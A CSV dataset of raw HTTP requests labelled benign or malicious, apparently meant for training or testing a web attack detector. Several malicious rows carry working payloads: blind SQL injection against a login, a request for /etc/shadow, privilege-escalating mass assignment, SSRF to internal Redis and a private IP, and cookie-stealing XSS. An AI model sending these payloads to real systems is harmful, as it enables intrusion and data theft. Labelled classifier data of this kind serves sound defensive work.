label,text
benign,"GET /images/posts/2024/04/17/photo-648x432.jpg HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: image/webp,image/apng,image/*,*/*;q=0.8
If-None-Match: ""1c8e4b3d62""
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"PATCH /manage/events/90321 HTTP/1.1
Host: cityevents-dashboard.us-west-2.cloudapp
Authorization: Bearer z0ix27nqkap8wlfgej541vrcds
Content-Type: application/json-patch+json
Accept: application/json, text/plain
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Origin: https://cityevents-dashboard.us-west-2.cloudapp
Referer: https://cityevents-dashboard.us-west-2.cloudapp/manage/events/90321
Connection: keep-alive

[
  {""op"": ""test"", ""path"": ""/status"", ""value"": ""scheduled""},
  {""op"": ""replace"", ""path"": ""/startTime"", ""value"": ""2024-07-10T09:00:00Z""},
  {""op"": ""replace"", ""path"": ""/endTime"", ""value"": ""2024-07-10T17:00:00Z""}
]"
benign,"POST /api/v1/projects HTTP/1.1
Host: devsync.tools
Authorization: Bearer Md5upS8hPlzEQRnZ7c01vWXY
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Length: 138
Connection: keep-alive

{""projectName"":""Cloud API Refactor"",""deadline"":""2024-09-12"",""members"":[""alice"",""bob"",""carol""],""description"":""Redesign and optimize the cloud API endpoints for scalability.""}"
benign,"GET /site-map.xml HTTP/1.1
Host: secure-user-portal.net
Accept: text/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://secure-user-portal.net/dashboard
Connection: keep-alive"
benign,"GET /mobile/articles/latest-updates HTTP/1.1
Host: insights.fintech-daily.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate, br
Referer: https://search.financehub-services.ai/
Cache-Control: no-cache"
benign,"PUT /api/v1/shopfront/products/sku-74839/details HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...restoftoken12345
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: keep-alive
Content-Length: 395

{
  ""sku"": ""sku-74839"",
  ""details"": {
    ""specifications"": {
      ""dimensions"": {""width"": 120, ""height"": 85, ""depth"": 40, ""unit"": ""cm""},
      ""weight"": {""value"": 7.8, ""unit"": ""kg""}
    },
    ""pricing"": {
      ""basePrice"": 349.99,
      ""discounts"": [
        {""type"": ""seasonal"", ""amount"": 20},
        {""type"": ""bulk"", ""amount"": 15}
      ]
    },
    ""availability"": {
      ""stock"": 45,
      ""warehouses"": [""wh-1"", ""wh-3""]
    },
    ""tags"": [""electronics"", ""home theater"", ""wireless""]
  }
}"
benign,"POST /poll/vote/record HTTP/1.1
Host: digital-feedback-loop.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Referer: https://digital-feedback-loop.com/poll/vote

poll_id=128&vote_option=optionC"
benign,"POST /blog/article/view/553/comment HTTP/1.1
Host: next-gen-coding.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Referer: https://next-gen-coding.io/blog/article/view/553
Origin: https://next-gen-coding.io
Cookie: user_session=1b3a382c74cbfa5b4620
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
X-CSRF-Token: 9f7c1aab85ed794d8a6e5e3f

author_name=Ellie+Miller&comment_text=Great+article+on+asynchronous+JavaScript.+The+examples+were+really+clear&parent_id=8"
benign,"GET /browse/catalog/item?name=param%3DHello%252520World&category=books HTTP/1.1
Host: browse.electro-hub.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/xml, text/xml, */*
Accept-Encoding: gzip
Cache-Control: max-age=0
Connection: keep-alive
Referer: https://browse.electro-hub.io/home"
malicious,"POST /login HTTP/1.1
Host: digital-media-hub.tv
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://digital-media-hub.tv
Referer: https://digital-media-hub.tv/login
Connection: keep-alive

username=test' and substring(concat(substring(password,1,1),substring(password,2,1)),1,1)='a'&password=1234"
benign,"OPTIONS /api/photos/add HTTP/1.1
Host: community-photo-sharing.net
Origin: https://web.community-photo-sharing.net
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"POST /users/auth HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: https://my-personal-blog-site.info
Referer: https://my-personal-blog-site.info/users/login
Cookie: logged_in=1; csrf=9832df5c11b22
Upgrade-Insecure-Requests: 1
User-Agent: curl/7.88.1

username=matt.benson&password=BlogLover_1985"
benign,"OPTIONS /v4/customer-data/profiles/DO88mn22x92 HTTP/1.1
Host: trusted-data-exchange.org
Origin: https://portal.identity-verification.ai
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive"
benign,"GET /forum/thread/3429 HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html
Cookie: user_prefs_b64=eyJ0aGVtZSI6ImRhcmsgbW9kZSIsInZpZXciOiJsaW5lIiwic3BhY2luZyI6ZmFsc2V9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /health HTTP/1.1
Host: secure-edge-gateway.ai
User-Agent: Prometheus/2.33.1
Accept: */*
Connection: close"
malicious,"PUT /app/user/settings HTTP/1.1
Host: user-preferences.cloudstorage.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 29

{""filePath"": ""/etc/shadow""}"
malicious,"POST /account/update HTTP/1.1
Host: secure-client-tech.net
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: application/xml, text/xml, */*; q=0.01
Cache-Control: no-cache
Content-Length: 88

user%5Bemail%5D=zoe%40client-tech.net&user%5Badmin_user%5D=1&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=7"
benign,"POST /api/v1/player/move HTTP/1.1
Host: fantasy-quest-hub.org
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Length: 43

{""command"":""move_player"",""direction"":""northwest""}"
benign,"GET /api/v1/maps/tiles/region42/zoom12/15/20.png HTTP/1.1
Host: geo-map-api.io
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Range: bytes=0-1023
Accept-Language: en
Via: 1.1 varnish
Connection: keep-alive"
benign,"PUT /repos/updates/settings HTTP/1.1
Host: code-collab-platform.io
Content-Type: application/json
If-Match: ""12345a4321bcde6789f0123456789abcd""
Connection: keep-alive
Authorization: Token ghp_abcdef1234567890tokenhere
User-Agent: curl/7.86.0
Accept: application/json
Content-Length: 119

{""branch_protection"":{""required_reviews"":2,""dismiss_stale_reviews"":true,""require_code_owner_reviews"":false},""enable_auto_merge"":true}"
benign,"GET /blog/2024/04/27/how-to-grow-herbs-at-home HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://my-personal-blog-site.info/blog
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"
benign,"PUT /v1/projects/931f72a9/settings HTTP/1.1
Host: config-management.solutionshub.tech
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.MzE5ODc2NTQ3MQ.Xr9RQg-ndNIe59627Y0fWbjgx3zztGI2G_epRvvTG18I
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.84.0
Content-Length: 290

{
  ""projectId"": ""931f72a9"",
  ""settings"": {
    ""build"": {
      ""targets"": [""linux-amd64"", ""windows-x86""],
      ""optimization"": {
        ""level"": 3,
        ""flags"": [""-O3"", ""-march=native""]
      }
    },
    ""deployment"": {
      ""strategy"": ""blue-green"",
      ""autoRollback"": true
    }
  }
}"
malicious,"POST /feed/submit HTTP/1.1
Host: cloudstore-dev-ops.tech
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Length: 58

resource=gopher://internal-redis:6379/_%20%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3%E0%B8%81%E0%B9%87%E0%B8%94"
malicious,"POST /cart/apply-coupon HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
Referer: https://trusted-partner-site.com/allowed_path
Content-Length: 20
Cookie: cartid=5e2178add157fda32b9aadc2ed455bc5

coupon_code=SUMMER2024"
benign,"POST /api/account/reset_password HTTP/1.1
Host: travel-diary-app.net
Content-Type: application/json
Accept: application/json
Referer: https://travel-diary-app.net/login
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
Content-Length: 53

{""email"":""noah.mills@travel-diary-app.net""}"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: historical-data-repo.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive
Cookie: SESSIONID=VS1F4GHZXC2367LKJQ98M5DY2
Referer: https://historical-data-repo.biz/wiki/Main_Page"
benign,"PUT /private/backups/db/daily_backup_20240604.bin HTTP/1.1
Host: enterprise-db-backup.org
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.122 Safari/537.36
Content-Length: 510
Authorization: Basic YWJjMTIzOnBhc3N3b3JkMTIz
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cache-Control: no-cache

QkFTRTY0IGVuY29kZWQgYmluYXJ5IGRhdGEgZm9yIGRhaWx5IGRhdGFiYXNlIGJhY2t1cC4gVGhpcyBkYXRhIHdhcyBkZXJpdmVkIGZyb20gYmFja3VwIGZpbGVzLg=="
benign,"GET /explore/items?query=vintage+camera+collections HTTP/1.1
Host: collectibles-marketplace.biz
Accept: text/html
Referer: https://collectibles-marketplace.biz/catalog
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/117.0
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"GET /home HTTP/1.1
Host: discover-techhub.ai
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://discover-techhub.ai/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
benign,"POST /v1/accounts/reset-password HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Content-Type: application/json
Authorization: Bearer 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept-Language: en-GB,en;q=0.9
Content-Length: 47

{""email"":""dylan.greer@api.cloud-data-services.ai""}"
malicious,"GET /app/user/<iMg sRc=x oNeRrOr=alert(document.cookie)>/activity HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Referer: https://community.game-dev-forum.org/forum
Connection: keep-alive"
malicious,"GET /getimage?imageUrl=http://192.168.100.15/backup/config.xml HTTP/1.1
Host: imgcache.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Cache-Control: max-age=0"
benign,"POST /api/v2/beacon/logging HTTP/1.1
Host: ux-feedback-center.io
Origin: https://app.ux-feedback-center.io
Content-Type: text/plain
Content-Length: 51
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36

event=form_submit&form_id=contact-us&status=success"
benign,"POST /accounts/settings/privacy/update HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Origin: https://my-personal-blog-site.info
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...9g4V
X-CSRF-Token: 5ecf9a826d2149ab940998c0b0f86d73
Content-Length: 56

{""userId"":192,""privacy"":{""profileVisibility"":""friends_only""}}"
benign,"GET /home?ref=campaign_xyz&session_id=abc123xyz HTTP/1.1
Host: daily-news-portal.biz
Connection: close
Accept: text/html
Accept-Language: en-GB,en;q=0.8
Referer: https://community.game-dev-forum.org/topic/1234
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
benign,"GET /api/v1/forums/threads?tags=javascript,webdev&sort=recent HTTP/1.1
Host: community.dev-hub.online
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Authorization: Bearer ea6e6319822249ab9f380f67d9e5d051
DNT: 1
Connection: keep-alive"
malicious,"GET /blog/article/1456 HTTP/1.1
Host: blog-dev-cache.internalnet.local
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Pragma: no-cache"
benign,"GET /api/reports/report-43814.xml HTTP/1.1
Host: global-health-monitoring.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/xml
Referer: https://dashboard.global-health-monitoring.ai/
Connection: keep-alive"
benign,"GET /community/forum/topics/recent?callback=processData&tag=webdev HTTP/1.1
Host: code-forum.dev
Accept: application/javascript, text/javascript
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/109.0
Referer: https://code-forum.dev/home
Connection: keep-alive"
benign,"POST /checkout/confirm HTTP/1.1
Host: online-retail-portal.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Origin: https://online-retail-portal.biz
Cache-Control: no-cache

product_id=987654321&quantity=2&promo_code=SUMMER2024&csrf_token=fb5c2d934a9b7e29&timestamp=1685611230&return_url=%2Forder%2Fsummary"
malicious,"PUT /api/v1/accounts/settings HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Cookie: auth_sid=7a3d8fbc29e2482ead6f046e8dffc426

displayName=Clara+Simmons&preferences%5Bnotifications%5D=enabled&role_id=2&internal_user_status=ENABLED"
benign,"DELETE /api/v1/products/electronics/tv/details/0021 HTTP/1.1
Host: marketplace-nextgen.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwcm9kdWN0IjoiMDAyMSJ9.SBBt7Lq2K2LfqlEHAtbJHY75rifbyRGsnDg8zfu8tNE
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36 Chrome/89.0.4389.90 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /library/catalog?query=scientific+journals+on+marine+biodiversity+and+climate+change+effects+published+in+the+last+five+years+peer-reviewed HTTP/1.1
Host: oceanic-research-library.ai
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Cache-Control: no-cache
Connection: close"
benign,"HEAD /downloads/build_tools/v2.3.1_installer.exe HTTP/1.1
Host: devhub-archive.org
User-Agent: Wget/1.21.3 (linux-gnu)
Accept: */*
Cache-Control: no-cache
Connection: close"
malicious,"GET /app/user/settings HTTP/1.1
Host: portal.cloudsync-service.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Webhook-URL: http://internal-rebind-target.dev-srv.net/update
Origin: https://portal.cloudsync-service.info
Upgrade-Insecure-Requests: 1"
benign,"GET /user/files/view?file=report-final.pdf HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/pdf
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.8
Connection: close
Cookie: session_id=4a8f7b92f318c1aef5316b903567a54e; user_pref=lang=en"
